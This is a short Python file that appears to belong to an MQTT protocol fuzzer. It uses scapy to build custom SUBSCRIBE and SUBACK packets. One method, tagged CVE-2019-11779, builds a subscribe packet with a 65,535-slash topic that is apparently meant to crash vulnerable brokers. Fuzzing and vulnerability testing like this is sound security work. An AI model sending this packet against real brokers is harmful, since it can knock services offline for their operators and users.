from scapy.contrib.mqtt import *
from scapy.all import *
import random
from scapy_mqtt import *

class Fuzz_Subscribe:
		
	#CVE-2019-11779
	def fuzz_topic(self):
		pkt = MQTT()/MQTTSubscribe(topics=MQTTTopic(topic=b"/"*65535))
		pkt.QOS = 1
		return pkt
		
	def fuzz_suback(self, msgid=0, reason_string=None, keyval={"key":None, "value":None}, retcode=0):
		"generate custom SUBACK packet"
		pkt = MQTT()/MQTTSuback()
		pkt.msgid= msgid
		if reason_string is not None:
			pkt.properties.append(MQTTPubSubStatusProperty(type=0x1F, reason_string=reason_string))
		if "key" in keyval and "value" in keyval and keyval['key'] is not None and keyval['value'] is not None:
			pkt.properties.append(MQTTPubSubStatusProperty(type=0x26, key=keyval['key'] , value=keyval['value'] ))		
		pkt.retcode= retcode
		return pkt	
		
	def fuzz_subscribe(self, msgid=0, topics=None, keyval={"key":None, "value":None}, qos=0, pkt=None):
		"generate custom SUBSCRIBE packet"
		if topics is not None:
			pkt = MQTT()/MQTTSubscribe(topics=topics)
		else:
			pkt = MQTT()/MQTTSubscribe()	
		pkt.msgid = msgid
		pkt.QOS = qos
		if "key" in keyval and "value" in keyval and keyval['key'] is not None and keyval['value'] is not None:
			pkt.properties.append(MQTTSubscribeProperty(type=0x26, key=keyval['key'] , value=keyval['value'] ))
		return pkt
